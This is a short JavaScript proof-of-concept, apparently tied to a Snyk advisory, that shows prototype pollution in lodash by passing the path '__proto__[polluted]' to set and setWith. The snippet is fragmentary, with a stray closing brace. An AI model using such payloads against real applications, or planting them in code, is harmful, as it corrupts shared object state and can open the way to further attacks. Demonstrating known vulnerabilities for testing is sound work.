//https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
 
  const lod = require("lodash");
  let obj = {};
   
  lod.set(obj, "__proto__[polluted]", "yes");
   
  delete obj.__proto__.polluted; // deletes the property set by this pollution
});

 
  const lod = require("lodash");
   
  lod.setWith({}, "__proto__[polluted]", "yes");
// End of file
